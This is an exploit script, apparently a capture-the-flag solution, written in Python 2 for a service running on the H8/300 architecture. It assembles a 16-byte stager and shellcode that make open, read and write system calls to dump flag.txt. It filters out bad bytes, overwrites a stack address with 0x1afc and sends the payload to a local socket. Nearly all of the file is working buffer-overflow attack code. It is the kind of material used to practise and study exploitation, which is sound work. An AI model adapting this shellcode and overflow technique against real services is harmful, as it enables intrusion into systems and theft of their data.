stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
    mov.w r5, r0
    mov.w r5, r0
    mov.w #0x1afc+18, r1
    mov.b #0x7f, r2l
#00001414 <___read>:
#    1414:	5e 00 00 c6 	jsr	@0xc6:24
#    1418:	54 70       	rts
    mov.w #0x1414, r3
    jsr @r3
.ascii "%s"
'''
asm = '''.section .text
.global _start

.ascii "%s"
_start:
    bsr pc
    mov.w @sp, r5
    add.b #44,r5l
    xor.w r6, r6
open:
    mov.w r5, r0
    mov.w r6, r1
    mov.w r6, r2
    mov.w	r1, @-sp
    subs	#2, sp
    .long (0x5e000000 | (0xc5))
read:
    mov.w r5, r1
    mov.w #0x7f, r2
    .long (0x5e000000 | (0xc6))
write:
    mov.w #1, r0
    mov.w r5, r1
    # buggy
    mov.w #0x20, r2
    .long (0x5e000000 | (0xc7))
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'h8300'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 16

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10001
s = mysock(IP, PORT)

SP = 0x1afc
sl(s, '\n000')
first = stager + p16b(SP) + '\n'
sl(s, first)
sl(s, shellcode)
shell(s)
